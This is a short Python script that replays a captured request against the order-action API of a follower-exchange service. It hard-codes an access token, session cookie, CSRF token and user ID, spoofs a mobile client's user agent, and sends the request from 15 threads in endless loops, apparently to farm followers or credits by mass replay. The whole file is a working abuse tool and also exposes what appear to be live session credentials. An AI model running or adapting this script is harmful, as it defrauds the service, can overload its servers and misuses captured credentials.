import requests, threading

url = "https://www.instafollowerspro.com:443/api/sharing-api/v5.0.1/order-action.php"

payload_like = "{\"accestkone\":\"aab7496f658668676067f362c132931b\",\"orderData\":{\"order_id\":\"c0G4avFS2dqiJ1pdzqbhjw==\",\"order_user_id\":\"+j+hnQx9Wl83MWeM92tyZA==\"},\"orderAction\":1}"
payload_follower = "{\"accestkone\":\"aab7496f658668676067f362c132931b\",\"orderData\":{\"order_id\":\"lJsFziTUF4LtFzww7d2tVw==\",\"order_user_id\":\"+j+hnQx9Wl83MWeM92tyZA==\"},\"orderAction\":1}"

headers = {
    "Cookie": "__cfduid=dcf3d8aad5722c504b8dda7a32b26b1841587388558; expires=Wed, 20-May-20 13:15:58 GMT; path=/; domain=.instafollowerspro.com; HttpOnly; SameSite=Lax; user_account_id=60139; expires=Tue, 20-Apr-2021 19:04:45 GMT; Max-Age=31556926; path=/api/manual-api/v3.2/; domain=instafollowerspro.com; secure; HttpOnly; csrftoken=d908422a129560b1c89d3d3e97f512c2; expires=Tue, 20-Apr-2021 19:04:45 GMT; Max-Age=31556926; path=/api/manual-api/v3.2/; domain=instafollowerspro.com; secure; HttpOnly;",
    "Connection": "close",
    "User-Agent": "okhttp/3.10.0",
    "Host": "www.instafollowerspro.com",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "160",
    "Content-Type": "application/json; charset=utf-8"
}

def send_post():
    while 1:
        requests.request("POST", url, data=payload_follower, headers=headers)

for i in range(15):
    threading.Thread(target=send_post).start()

